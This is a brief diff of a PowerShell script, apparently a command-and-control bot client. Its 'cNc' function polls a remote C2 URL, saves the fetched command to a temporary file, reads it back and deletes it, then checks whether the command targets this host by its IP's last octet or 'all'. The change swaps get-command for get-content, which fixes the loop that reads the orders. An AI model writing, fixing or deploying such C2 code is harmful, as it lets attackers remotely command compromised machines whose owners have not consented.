@@ -43,7 +43,7 @@ function cNc{
     $httpCommand=invoke-restmethod $cNcURL
     $httpCommand | out-file -filepath .\rf.txt
 
-    [string[]]$read = get-command -path .\rf.txt
+    [string[]]$read = get-content -path .\rf.txt
     rm .\rf.txt
     
     if($read[1] -eq ($hostIP.split("."))[3] -or $read[1] -eq 'all'){
